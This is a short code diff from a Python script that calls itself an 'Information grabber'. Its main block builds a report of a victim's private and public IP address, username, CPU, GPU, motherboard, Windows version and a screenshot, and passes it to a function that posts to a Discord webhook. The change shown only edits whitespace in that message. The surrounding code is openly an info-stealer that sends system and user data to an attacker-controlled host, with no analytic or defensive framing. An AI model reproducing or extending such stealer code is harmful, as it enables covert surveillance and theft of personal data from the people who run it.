@@ -100,7 +100,7 @@ def send_discord_webhook(webhook_url, message, image_paths):
 if __name__ == "__main__":
     webhook_url = "WebHook URL"
     
-    message = f"# Information grabber\n**⏲️Hour:** {time} \n**🛜IP private:** {ip_locale} \n**📶IP public:** {ip_publique} \n**🚹Name User:** {name_of_user} \n **🧠CPU:** {cpu}\n**🎮GPU: **{gpu}\n **🧩MotherBoard: **{baseboard}\n**Version of Windows: **{windows_version}\n## 📸Screenshot: \nBy aza"
+    message = f"# Information grabber\n**⏲️Hour:** {time} \n**🛜IP private:** {ip_locale} \n**📶IP public:** {ip_publique} \n**🚹Name User:** {name_of_user} \n **🧠CPU:** {cpu}\n**🎮GPU: **{gpu}\n **🧩MotherBoard: **{baseboard}\n**Version of Windows: **{windows_version}\n## 📸Screenshot: \n By aza"
 
 
     
